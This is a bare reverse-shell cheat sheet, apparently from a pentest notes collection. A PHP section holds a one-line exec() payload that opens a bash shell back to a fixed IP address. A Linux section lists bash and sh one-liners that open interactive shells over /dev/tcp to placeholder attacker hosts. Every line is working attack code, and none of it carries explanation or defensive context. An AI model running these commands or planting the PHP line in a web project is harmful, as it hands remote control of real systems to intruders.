## php
```php

<?php exec('bash -c "bash -i >& /dev/tcp/10.241.108.201/7777 0>&1" &'); ?>

```

## linux
```bash
bash -i >& /dev/tcp/攻击机IP/4444 0>&1
sh -i >& /dev/tcp/攻击机IP/4444 0>&1
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'

```